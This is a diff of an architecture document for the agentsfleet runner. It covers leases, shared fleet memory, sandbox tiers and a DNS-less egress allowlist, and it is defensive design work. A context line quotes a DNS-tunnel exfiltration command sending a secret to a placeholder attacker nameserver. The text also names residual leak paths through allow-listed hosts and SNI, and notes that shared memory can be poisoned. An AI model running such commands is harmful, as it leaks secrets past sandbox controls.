@@ -3,7 +3,9 @@
 > Parent: [`README.md`](./README.md) · Sibling: [`data_flow.md`](./data_flow.md) (how one event flows through this split). · User-facing: [docs.agentsfleet.net/runners](https://docs.agentsfleet.net/runners).
 
 > [!IMPORTANT]
-> **Implemented (M80_002 cutover).** This is the runtime the codebase runs now. `agentsfleetd` is the control plane and the host-resident `agentsfleet-runner` daemon is the execution plane. The old single-process `agentsfleetd worker` and the standalone sandbox sidecar are deleted. [`data_flow.md`](./data_flow.md) traces an event through it; this file is the structural picture.
+> **Implemented (M80_002 cutover).** This is the runtime the codebase runs now, with `agentsfleetd` as the control plane and the host-resident `agentsfleet-runner` daemon as the execution plane. The old single-process `agentsfleetd worker` and the standalone sandbox sidecar are deleted.
+
+[`data_flow.md`](./data_flow.md) traces an event through it; this file is the structural picture.
 
 Read this when a spec touches the `agentsfleet-runner` binary, the `/v1/runners` control protocol, runner registration, the node fleet, or assignment, fencing and reclaim.
 
@@ -392,7 +394,9 @@ Two indexes serve the read. `idx_leases_runner_id_created_at_id` answers the pag
 
 A partial index was rejected there. The tag list binds as a parameter array, and a partial-index predicate cannot be proven against one. Read cost stays flat as history grows, and the index-usage integration lane pins both the shapes and the plans.
 
-**History is bounded, not integral.** The retention sweeper in `afd_runner` deletes terminal-status leases in bounded batches once 30 days pass from settlement. It starts with the other sweepers in the daemon binary. The clock is `updated_at`, which settle and reclaim both stamp, so a lease acquired long ago and settled yesterday keeps its full window.
+**History is bounded, not integral.** The retention sweeper in `afd_runner` deletes terminal-status leases in bounded batches once 30 days pass from settlement.
+
+The sweeper starts with the other sweepers in the daemon binary. The clock is `updated_at`, which settle and reclaim both stamp, so a lease acquired long ago and settled yesterday keeps its full window.
 
 Only the per-lease event tags are eligible: `PER_WORK_EVENTS` in `afd_runner`'s retention sweep, meaning `lease_acquired` and `lease_released`. The lifecycle tags are the Activity feed's entire content and are kept at any age.
 
@@ -587,9 +591,13 @@ The hold gives its runner a head start at the slot, never the slot. The holder c
 
 The decided workspace scope (§"Memory backends and scope") gives one workspace key many live writers by design. Its fencing token proves a live lease, not a sole writer; the memory work defines how concurrent writes to one key resolve.
 
-**Cadence.** The supervisor pushes at **run end** (mandatory) and **mid-run** on the existing `memory_checkpoint_every` cadence. A long run's learned memory is so durable before the run finishes, and a crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, the fleet's next run loads the snapshot the previous run just stored.
+**Cadence.** The supervisor pushes at **run end** (mandatory) and **mid-run** on the existing `memory_checkpoint_every` cadence.
 
-**Selection policy.** The loaded window is a deterministic, category-pinned byte window, a pure function of (rows, budget). The `core` tier is pinned: every `core` entry, newest-first, within the byte budget. The newest non-core entries fill the remainder.
+A long run's learned memory is so durable before the run finishes, and a crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, the fleet's next run loads the snapshot the previous run just stored.
+
+**Selection policy.** The loaded window is a deterministic, category-pinned byte window, a pure function of (rows, budget).
+
+The `core` tier is pinned: every `core` entry, newest-first, within the byte budget. The newest non-core entries fill the remainder.
 
 Unknown and custom categories are windowed, never silently pinned. Cap eviction orders the same way.
 
@@ -617,9 +625,13 @@ That holds whatever a vendor's keys can scope. The runner keeps holding no store
 
 A run still costs one load and one push; a recall the window misses adds a capped number of calls.
 
-**Accepted risks.** Shared memory lets a private channel's facts reach other fleets. It also lets a fleet reading untrusted input plant a "fact" that a fleet holding a write token trusts. Both now pass only through workspace-scoped memory, which only granted fleets reach, and the recorded writer keeps every shared entry traceable.
+**Accepted risks.** Shared memory lets a private channel's facts reach other fleets.
 
-**Built.** Every memory read and write in `agentsfleetd` goes through `afd_memory::Memories`, held once by the daemon. It reads each fleet's workspace and grants from `fleet.fleets`, applies them, and calls the Postgres store, `afd_memory::PgStore`. Every entry keeps its writer fleet in its identity, `(workspace_id, fleet_id, key)`, and carries `workspace_visible`.
+Shared memory also lets a fleet reading untrusted input plant a "fact" that a fleet holding a write token trusts. Both now pass only through workspace-scoped memory, which only granted fleets reach, and the recorded writer keeps every shared entry traceable.
+
+**Built.** Every memory read and write in `agentsfleetd` goes through `afd_memory::Memories`, held once by the daemon.
+
+`afd_memory::Memories` reads each fleet's workspace and grants from `fleet.fleets`, applies them, and calls the Postgres store, `afd_memory::PgStore`. Every entry keeps its writer fleet in its identity, `(workspace_id, fleet_id, key)`, and carries `workspace_visible`.
 
 Access is a workspace setting with read and publish granted apart: `memory_reads_workspace` and `memory_publishes_workspace` on `fleet.fleets`, set by `PATCH …/fleets/{fleet_id}/memory-access` under `fleet:write`. A granted reader's window carries other fleets' shared entries, each naming its writer, within `HYDRATE_SHARED_BYTES` after its own window. A share from a fleet without publish is refused by the `memory_store` tool and skipped and counted at the push.
 
@@ -793,7 +805,9 @@ The capability report stays unauthenticated self-assertion, so trust for placeme
 
 The runner builds the same bubblewrap sandbox under every tier, and a host that cannot build one refuses `run` at boot ([Runner execution](./runner_execution.md) §"Sandbox engines"). The tier labels the self-test and sets what the daemon's reconcile demands (`afd_runner`'s reconcile module). On a Mac, `agentsfleet-runner` runs inside a Linux VM (Docker Desktop, OrbStack or Lima); there is no macOS engine.
 
-> **Tiers ≠ egress policy.** `sandbox_tier` reports *isolation strength* (file system, system call, process) and is **orthogonal** to network egress. Landlock governs the file system; its network support is TCP *port* binding and connecting only, not host allowlisting. So no tier substitutes for the egress model below.
+> **Tiers ≠ egress policy.** `sandbox_tier` reports *isolation strength* (file system, system call, process) and is **orthogonal** to network egress.
+
+> Landlock governs the file system; its network support is TCP *port* binding and connecting only, not host allowlisting. So no tier substitutes for the egress model below.
 
 ## The sandbox filesystem rules
 
@@ -855,9 +869,13 @@ Each entry is read as a URL's host, using `https://` when no scheme is present. 
 
 HTTP tools parse additional domains with the same helper, `af_egress::allowlist_host`. The supervisor resolves sandbox names to IPv4 with the host resolver.
 
-**The inference host is not in the set.** The agent loop calls the model provider from the supervisor, outside every sandbox. It uses the base URL saved for the selected model ([Runner execution](./runner_execution.md) §Crates). A sandbox has no reason to reach it.
+**The inference host is not in the set.** The agent loop calls the model provider from the supervisor, outside every sandbox.
 
-**Name resolution is supervisor-provided; there is no reachable resolver.** The supervisor renders a static `/etc/hosts` with each allowlist name and its resolved address. It also renders an `/etc/resolv.conf` naming no server. Both are bound read-only into the sandbox. nf_tables drops **all** sandbox egress to port 53, so no forwarding resolver is reachable.
+The agent loop uses the base URL saved for the selected model ([Runner execution](./runner_execution.md) §Crates). A sandbox has no reason to reach it.
+
+**Name resolution is supervisor-provided; there is no reachable resolver.** The supervisor renders a static `/etc/hosts` with each allowlist name and its resolved address.
+
+The supervisor also renders an `/etc/resolv.conf` naming no server. Both are bound read-only into the sandbox. nf_tables drops **all** sandbox egress to port 53, so no forwarding resolver is reachable.
 
 That closes the DNS-tunnel exfiltration channel (`dig $secret.attacker-ns.com @resolver`) by the *absence* of any resolver. An undeclared host misses `/etc/hosts` and fails **fast at resolution**, with no 30-second hang.
 
@@ -875,13 +893,25 @@ A scope that fails to build is torn down with its sandbox, and the lease is refu
 
 **Lifecycle.** The scope is built with the sandbox, before the lease runs, and removed with it. A held sandbox is reused only when the runner's egress, its policy and its resolved set, is unchanged ([Runner execution](./runner_execution.md) §"Workspace between leases"). Building the engine sweeps every `afegress*` table and `afv*` link a crashed run left, before the first lease.
 
-**The probe.** At boot the runner builds one scope and tears it down, and reads `net.ipv4.ip_forward`. Only success reports `egress_enforcement: true`. Otherwise the daemon reads an `allow_list_egress` runner degraded with `REASON_EGRESS_ENFORCEMENT_UNAVAILABLE` and leases it nothing (`afd_runner`'s reconcile module).
+**The probe.** At boot the runner builds one scope and tears it down, and reads `net.ipv4.ip_forward`.
+
+Only success reports `egress_enforcement: true`. Otherwise the daemon reads an `allow_list_egress` runner degraded with `REASON_EGRESS_ENFORCEMENT_UNAVAILABLE` and leases it nothing (`afd_runner`'s reconcile module).
 
 The host needs nf_tables in its kernel, `net.ipv4.ip_forward=1`, which the runner playbook sets, and no host firewall whose forward policy drops. A drop in any table's forward chain is final.
 
-> **The allowlist versus the deferred name layer.** The above is a resolve-at-bind address pin. It has an own namespace, a host-side nf_tables allowlist, no proxy and no resolver in the data path. The name layer arrives when the fleet opens to untrusted or customer-operated runners with **rotating-CDN host sets** that a pin at bind cannot track. It is added the **modern** way, as an **eBPF/FQDN-aware datapath**. That datapath learns allowed addresses by snooping DNS *answers* and programs the same kernel set live. The model is the Cilium `toFQDNs` pattern, or a minimal DNS-answer watcher updating our existing set. There is **no forward proxy, no SNI/`CONNECT` interception and no TLS man-in-the-middle**; that squid-era approach is explicitly *not* the direction. It evolves the datapath from pin at bind to pin from observed DNS, same set. Introducing a controlled resolver to snoop is itself the change from the resolver-less posture, gated to that tier. A standing residual holds at every tier. An allow-listed write-capable host (for example `github.com`) is still an exfiltration channel by design. Only short-lived, scoped tokens close it, a credential-model change, not this layer.
+> **The allowlist versus the deferred name layer.** The above is a resolve-at-bind address pin. It has an own namespace, a host-side nf_tables allowlist, no proxy and no resolver in the data path.
 
-> **Second residual: shared front ends.** The kernel set matches destination addresses alone. The default registry hosts sit on front ends shared with other sites. A sandbox can reach any of those sites by naming it in Server Name Indication (SNI). A hard boundary needs `registry_allowlist` pointed at a mirror on addresses the operator owns.
+> The name layer arrives when the fleet opens to untrusted or customer-operated runners with **rotating-CDN host sets** that a pin at bind cannot track. It is added the **modern** way, as an **eBPF/FQDN-aware datapath**. That datapath learns allowed addresses by snooping DNS *answers* and programs the same kernel set live.
+
+> The model is the Cilium `toFQDNs` pattern, or a minimal DNS-answer watcher updating our existing set. There is **no forward proxy, no SNI/`CONNECT` interception and no TLS man-in-the-middle**; that squid-era approach is explicitly *not* the direction. It evolves the datapath from pin at bind to pin from observed DNS, same set.
+
+> Introducing a controlled resolver to snoop is itself the change from the resolver-less posture, gated to that tier. A standing residual holds at every tier.
+
+> An allow-listed write-capable host (for example `github.com`) is still an exfiltration channel by design. Only short-lived, scoped tokens close it, a credential-model change, not this layer.
+
+> **Second residual: shared front ends.** The kernel set matches destination addresses alone. The default registry hosts sit on front ends shared with other sites.
+
+> A sandbox can reach any of those sites by naming it in Server Name Indication (SNI). A hard boundary needs `registry_allowlist` pointed at a mirror on addresses the operator owns.
 
 ### HTTP destination settings
 
